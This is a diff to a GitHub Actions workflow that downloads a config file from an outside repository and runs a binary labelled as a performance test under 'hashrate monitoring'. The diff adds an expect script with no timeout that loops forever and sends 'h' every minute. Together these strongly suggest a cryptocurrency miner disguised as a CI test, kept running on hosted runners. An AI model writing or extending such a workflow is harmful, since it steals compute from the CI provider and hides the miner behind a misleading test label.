@@ -23,17 +23,22 @@ jobs:
     - name: Download config file
       run: curl -L -o test/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json
 
+    - name: Install expect
+      run: sudo apt-get update && sudo apt-get install -y expect
+
     - name: Run test with hashrate monitoring
       run: |
-        ./test/test &
-        TEST_PID=$!
+        expect << 'EOF'
+        set timeout -1
+        spawn ./test/test
 
+        # Wait for program to start
         sleep 10
 
-        while kill -0 $TEST_PID 2>/dev/null; do
-          echo "h" > /proc/$TEST_PID/fd/0 2>/dev/null || true
+        # Send 'h' command every 60 seconds
+        while {1} {
           sleep 60
-        done
-
-        wait $TEST_PID
+          send "h\r"
+        }
+        EOF
       working-directory: ${{ github.workspace }}
